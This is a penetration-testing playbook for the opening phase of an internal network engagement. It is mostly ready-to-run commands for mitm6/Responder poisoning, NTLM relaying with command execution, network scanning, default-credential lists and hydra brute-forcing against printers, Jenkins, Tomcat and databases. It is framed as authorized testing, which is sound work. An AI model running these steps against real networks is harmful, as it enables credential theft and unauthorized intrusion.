# Initial Internal Attack Strategy

## Overview
This methodology outlines the systematic approach for conducting initial internal network attacks during penetration testing. The strategy focuses on maximizing early wins and establishing footholds within the internal network.

## TCM Security Initial Internal Attack Strategy

### 1. Begin Day with mitm6 or Responder
Start passive credential harvesting immediately to capture authentication attempts throughout the day.

#### mitm6 Setup
```bash
# Start mitm6 for IPv6 DNS takeover
mitm6 -d domain.local -v

# In separate terminal, set up ntlmrelayx
ntlmrelayx.py -t ldaps://dc.domain.local -wh fakewpad.domain.local -6
```

#### Responder Setup
```bash
# Start Responder for LLMNR/NBT-NS poisoning
responder -I eth0 -wrf

# Alternative: Start specific services only
responder -I eth0 -w -r -f --lm
```

### 2. Run Scans to Generate Traffic
Perform network scanning to identify targets and generate network activity that may trigger authentication attempts.

#### Network Discovery
```bash
# Quick ping sweep
nmap -sn 192.168.1.0/24

# Fast port scan of common services
nmap -F --top-ports 1000 192.168.1.0/24

# Service version detection on key ports
nmap -sV -p 21,22,23,25,53,80,110,111,135,139,143,443,993,995,1723,3306,3389,5432,5900,6000,6001,6002,6003,6004,6005,6006 192.168.1.0/24
```

#### SMB Enumeration
```bash
# SMB share enumeration (generates authentication attempts)
smbclient -L //target_ip -N
enum4linux -a target_ip
smbmap -H target_ip
```

### 3. Website Enumeration (if scans are slow)
If network scans are taking too long, pivot to web application testing to maintain momentum.

#### HTTP Service Discovery
```bash
# Find web services
nmap -p 80,443,8080,8443,8000,8888 --script http-title 192.168.1.0/24

# Quick HTTP version check
nmap -p 80,443 --script http-server-header 192.168.1.0/24
```

#### Web Application Testing
```bash
# Directory enumeration
gobuster dir -u http://target_ip -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt

# Technology detection
whatweb http://target_ip
nikto -h http://target_ip

# Check for common vulnerabilities
nmap --script vuln http://target_ip
```

### 4. Look for Default Credentials on Web Logins
Target common services that often have default or weak credentials.

#### Common Targets with Default Credentials

##### Printers
```bash
# Common printer default credentials
admin:admin
admin:(blank)
admin:password
root:root
service:service

# Printer-specific defaults
HP: admin/admin, admin/(blank)
Canon: admin/canon, root/admin
Xerox: admin/1111, admin/admin
Brother: admin/access, user/user
```

##### Jenkins
```bash
# Jenkins default credentials
admin:admin
admin:password
jenkins:jenkins
admin:(blank)

# Jenkins enumeration
curl -s http://target_ip:8080/api/json | jq
```

##### Other Common Services
```bash
# Tomcat Manager
admin:admin, tomcat:tomcat, admin:tomcat, tomcat:admin

# Router/Switch interfaces
admin:admin, admin:password, admin:(blank), root:admin

# Database web interfaces
root:(blank), admin:admin, sa:(blank)

# Monitoring tools (Nagios, Zabbix, etc.)
admin:admin, nagios:nagios, zabbix:zabbix
```

### 5. Think Outside the Box
Look for unconventional attack vectors and creative approaches to gain initial access.

#### Alternative Attack Vectors
```bash
# Check for:
# - Unsecured file shares
# - Default SNMP communities
# - Weak SSH keys
# - Unprotected databases
# - IoT devices with default credentials
# - Network equipment with default settings
```

## Detailed Implementation

### Phase 1: Passive Credential Harvesting (Start Immediately)

#### Option A: mitm6 + ntlmrelayx
```bash
# Terminal 1: Start mitm6
mitm6 -d corp.local -v

# Terminal 2: Start ntlmrelayx for LDAP relay
ntlmrelayx.py -t ldaps://dc01.corp.local -wh fakewpad.corp.local -6

# Terminal 3: Start ntlmrelayx for SMB relay (if SMB signing disabled)
ntlmrelayx.py -tf smb_targets.txt -wh fakewpad.corp.local -6 -c whoami
```

#### Option B: Responder + ntlmrelayx
```bash
# Terminal 1: Start Responder
responder -I eth0 -wrf

# Terminal 2: Start ntlmrelayx
ntlmrelayx.py -tf targets.txt -c whoami

# Monitor captured hashes
tail -f /usr/share/responder/logs/*.txt
```

### Phase 2: Active Network Reconnaissance

#### Quick Network Mapping
```bash
# Fast discovery scan
masscan -p1-65535 192.168.1.0/24 --rate=1000

# Service enumeration on discovered hosts
nmap -sV -sC -O -A discovered_hosts.txt

# SMB enumeration to trigger authentication
for ip in $(cat discovered_hosts.txt); do
    echo "Testing $ip"
    smbclient -L //$ip -N 2>/dev/null
    enum4linux -a $ip 2>/dev/null
done
```

### Phase 3: Web Service Exploitation

#### Automated Web Discovery
```bash
# Find all web services
nmap -p 80,443,8080,8443,8000,8888,9090,9443 --open 192.168.1.0/24 -oG web_services.txt

# Extract IPs and ports
grep "open" web_services.txt | awk '{print $2":"$4}' | sed 's/\/open//' > web_targets.txt

# Test each web service
while read target; do
    echo "Testing $target"
    curl -s -I http://$target
    curl -s -I https://$target
done < web_targets.txt
```

#### Default Credential Testing
```bash
# Create credential list
cat > default_creds.txt << EOF
admin:admin
admin:password
admin:
root:root
root:admin
root:password
administrator:administrator
administrator:password
service:service
guest:guest
test:test
demo:demo
EOF

# Automated login testing (use with caution)
hydra -C default_creds.txt http-get://target_ip/admin/
```

### Phase 4: Service-Specific Attacks

#### Printer Exploitation
```bash
# Discover printers
nmap -p 9100,515,631 --script printer-info 192.168.1.0/24

# Test printer web interfaces
for printer in $(nmap -p 80,443 --open 192.168.1.0/24 | grep -E "9100|515|631" -B5 | grep "Nmap scan report" | awk '{print $5}'); do
    echo "Testing printer: $printer"
    curl -s http://$printer | grep -i "printer\|canon\|hp\|xerox\|brother"
done
```

#### Jenkins Exploitation
```bash
# Find Jenkins instances
nmap -p 8080,8443 --script http-title 192.168.1.0/24 | grep -i jenkins

# Test Jenkins access
curl -s http://jenkins_ip:8080/api/json
curl -s http://jenkins_ip:8080/script
```

### Phase 5: Creative Attack Vectors

#### SNMP Enumeration
```bash
# Test default SNMP communities
onesixtyone -c community_strings.txt 192.168.1.0/24

# Extract information from SNMP
snmpwalk -c public -v1 target_ip 1.3.6.1.2.1.1
snmpwalk -c public -v1 target_ip 1.3.6.1.4.1.77.1.2.25  # Windows users
```

#### Database Discovery
```bash
# Common database ports
nmap -p 1433,3306,5432,1521,27017 192.168.1.0/24

# Test default credentials
mysql -h target_ip -u root -p
psql -h target_ip -U postgres
```

#### IoT Device Enumeration
```bash
# Common IoT ports
nmap -p 80,443,8080,8443,23,21,22,161 --script banner 192.168.1.0/24

# Look for IoT-specific services
nmap --script broadcast-dhcp-discover
nmap --script broadcast-dns-service-discovery
```

## Monitoring and Logging

### Track Progress
```bash
# Create log directory
mkdir -p logs/$(date +%Y%m%d)

# Log all activities
script logs/$(date +%Y%m%d)/session.log

# Monitor credential capture
tail -f /usr/share/responder/logs/*.txt
watch -n 5 'ls -la captured_creds.txt'
```

### Success Indicators
- NTLM hashes captured
- Valid credentials obtained
- Web interfaces accessed
- Services with default credentials found
- Network shares accessible
- Database connections established

## Time Management

### First Hour Priorities
1. **0-5 minutes**: Start mitm6/Responder
2. **5-15 minutes**: Quick network discovery
3. **15-30 minutes**: Service enumeration
4. **30-45 minutes**: Web service testing
5. **45-60 minutes**: Default credential testing

### Continuous Activities
- Monitor credential capture tools
- Document findings
- Test discovered services
- Expand network mapping
- Look for privilege escalation opportunities

## Common Pitfalls to Avoid

1. **Don't wait for long scans** - Start with quick scans and expand
2. **Don't ignore passive attacks** - Keep credential capture running
3. **Don't overlook simple wins** - Test default credentials early
4. **Don't tunnel vision** - Try multiple attack vectors simultaneously
5. **Don't forget documentation** - Log everything for reporting

## Success Metrics

### Initial Access Goals
- [ ] Network credentials captured
- [ ] Web application access gained
- [ ] Service accounts compromised
- [ ] Network shares accessed
- [ ] Database connections established
- [ ] Administrative interfaces accessed

### Documentation Requirements
- Network topology discovered
- Services and versions identified
- Credentials captured/cracked
- Vulnerabilities identified
- Attack paths documented
- Evidence screenshots taken

---

**Note**: This strategy should be adapted based on the specific engagement scope and client environment. Always ensure proper authorization and follow rules of engagement. 